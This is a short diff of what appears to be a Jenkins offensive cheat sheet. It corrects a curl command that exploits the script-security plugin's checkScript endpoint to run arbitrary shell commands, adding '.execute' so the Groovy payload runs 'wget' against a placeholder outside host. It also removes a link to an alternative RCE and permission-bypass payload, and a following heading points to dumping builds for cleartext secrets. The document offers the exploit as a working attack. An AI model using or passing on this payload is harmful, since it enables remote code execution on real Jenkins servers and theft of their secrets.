@@ -45,10 +45,8 @@ curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.s
 
 Execute arbitraty bash commands:
 ```bash
-curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt"}}'
+curl -k -4 -X POST "https://example.com/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/" -d "sandbox=True" -d 'value=class abcd{abcd(){"wget xx.xx.xx.xx/bla.txt".execute}}'
 ```
-
-Alternative RCE/DACL bypass payload [here](https://gist.github.com/akhil-reni/e2116cc243af096ca3416168f49b3298) though be advised that this one will absolutely trash the whole security configuration!
 
 
 Dumping builds to find cleartext secrets
